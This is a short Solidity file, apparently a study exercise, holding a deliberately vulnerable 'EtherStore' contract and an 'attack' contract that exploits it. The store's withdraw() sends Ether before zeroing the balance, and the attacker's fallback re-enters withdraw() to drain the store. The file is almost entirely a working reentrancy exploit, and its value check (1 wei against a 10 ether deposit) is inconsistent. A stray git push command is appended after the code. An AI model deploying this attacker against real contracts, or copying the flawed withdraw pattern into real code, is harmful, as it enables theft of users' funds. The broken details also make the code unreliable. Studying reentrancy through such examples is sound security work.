// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
contract EtherStore{
mapping(address => uint) public balances;
 
function deposit() public payable{
    balances[msg.sender] += msg.value;
 
}
 
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
    balances[msg.sender] = 0;  
    }
 
function getBalance() public view returns(uint){
    return address(this).balance; //this get the balance of this contract
}
 
}
 
contract attack{
    EtherStore public etherStore;
 
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
 
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
 
function Attack() external payable{
require(msg.value >=1 );
etherStore.deposit{value: 10 ether}();
etherStore.withdraw();
}
 
function getBalance() public view returns(uint){
    return address(this).balance;
}
 
}
git push --set-upstream origin master
